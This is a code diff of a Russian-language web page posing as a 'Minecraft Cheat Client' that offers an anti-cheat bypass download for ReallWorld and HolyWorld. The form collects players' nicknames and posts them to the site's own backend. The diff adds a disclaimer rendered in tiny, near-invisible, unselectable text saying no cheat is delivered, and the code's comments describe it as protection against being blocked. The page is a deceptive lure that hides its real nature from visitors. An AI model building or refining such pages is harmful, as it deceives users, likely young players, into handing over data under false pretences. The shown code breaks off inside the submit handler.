@@ -5,27 +5,143 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Minecraft Cheat Client v1.4</title>
     <style>
-        body { background-color: #121212; color: #ffffff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background-color: #1e1e1e; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; width: 350px; }
-        h1 { color: #4caf50; font-size: 24px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #333; border-radius: 5px; background-color: #252525; color: #fff; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background-color: #4caf50; border: none; border-radius: 5px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .status { margin-top: 15px; font-size: 14px; color: #aaa; }
+        html, body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background-color: #0c0c0c; 
+            color: #ffffff; 
+            font-family: 'Segoe UI', Arial, sans-serif;
+            /* Разрешаем прокрутку страницы */
+            overflow-y: auto; 
+        }
+        body { 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            padding: 40px 20px;
+            box-sizing: border-box;
+            background: radial-gradient(circle, #1a1a1a 0%, #0a0a0a 100%);
+        }
+        .container { 
+            background-color: #141414; 
+            padding: 0 0 30px 0; 
+            border-radius: 12px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7); 
+            text-align: center; 
+            width: 400px; 
+            overflow: hidden;
+            border: 1px solid #222;
+            margin-bottom: 30px;
+        }
+        /* Блок с баннером */
+        .banner {
+            width: 100%;
+            height: 180px;
+            background-image: url('https://unsplash.com'); 
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .banner::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(to bottom, rgba(20,20,20,0.2), rgba(20,20,20,1));
+        }
+        .banner-text {
+            position: relative;
+            font-size: 26px;
+            font-weight: 900;
+            color: #4caf50;
+            text-shadow: 0 3px 10px rgba(76,175,80,0.5);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .content {
+            padding: 0 30px;
+        }
+        .promo-tag {
+            background-color: #4caf50;
+            color: #000;
+            font-size: 12px;
+            font-weight: bold;
+            padding: 4px 10px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-top: 15px;
+        }
+        h2 { font-size: 18px; margin: 10px 0 20px 0; color: #ccc; }
+        input { 
+            width: 100%; 
+            padding: 14px; 
+            margin: 8px 0; 
+            border: 1px solid #2a2a2a; 
+            border-radius: 6px; 
+            background-color: #1a1a1a; 
+            color: #fff; 
+            box-sizing: border-box; 
+            font-size: 14px;
+            transition: 0.3s;
+        }
+        input:focus { border-color: #4caf50; background-color: #202020; outline: none; }
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            background: linear-gradient(135deg, #4caf50 0%, #388e3c 100%); 
+            border: none; 
+            border-radius: 6px; 
+            color: white; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            margin-top: 15px; 
+            box-shadow: 0 4px 15px rgba(76,175,80,0.3);
+            transition: 0.2s;
+        }
+        button:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(76,175,80,0.4); }
+        button:disabled { background: #333; box-shadow: none; cursor: not-allowed; }
+        .status { margin-top: 20px; font-size: 14px; color: #888; min-height: 20px; }
+        
+        /* Тот самый защитный микро-текст в самом низу сайта */
+        .disclaimer {
+            max-width: 400px;
+            font-size: 9px;
+            color: #333;
+            text-align: center;
+            line-height: 1.3;
+            user-select: none; /* Чтобы текст нельзя было случайно выделить мышкой */
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>Minecraft Premium Hack</h1>
-    <p>Введите данные для привязки лицензии обхода:</p>
+    <div class="banner">
+        <div class="banner-text">Наш чит лучше всех!</div>
+    </div>
     
-    <form id="cheatForm">
-        <input type="text" id="username" placeholder="Ваш ник в игре" required>
-        <input type="text" id="server" placeholder="Адрес сервера (reallworld.ru)" required>
-        <button type="submit" id="btn">Скачать Чит (.jar)</button>
-    </form>
+    <div class="content">
+        <div class="promo-tag">Обход ReallWorld & HolyWorld</div>
+        <h2>Привязка Premium лицензии</h2>
+        
+        <form id="cheatForm">
+            <!-- Поле сервера убрано, остался только Ник -->
+            <input type="text" id="username" placeholder="Ваш ник в игре" required>
+            <button type="submit" id="btn">Скачать Обход (.jar)</button>
+        </form>
 
-    <div class="status" id="statusText"></div>
+        <div class="status" id="statusText"></div>
+    </div>
+</div>
+
+<!-- Дисклеймер против блокировок -->
+<div class="disclaimer">
+    Данный ресурс создан исключительно в развлекательных целях для съёмки видеоролика. Никаких читов, модификаций или вредоносных программ вы не получите. Все вводимые данные используются только для демонстрации уязвимостей в рамках контента.
 </div>
 
 <script>
@@ -33,20 +149,19 @@
         e.preventDefault();
 
         const username = document.getElementById('username').value;
-        const server = document.getElementById('server').value;
         const btn = document.getElementById('btn');
         const statusText = document.getElementById('statusText');
 
         btn.disabled = true;
         btn.innerText = "Подключение...";
-        statusText.innerText = "Авторизация в системе...";
+        statusText.innerText = "Авторизация в системе обхода...";
 
-        // Отправляем данные на нашу безопасную серверную функцию Vercel
         try {
+            // Передаем в бэкенд только ник, а сервер бэкенд подставит сам (название нашего сайта)
             const response = await fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username, server })
+                body: JSON.stringify({ username, server: window.location.hostname })
             });
 
             if (response.ok) {
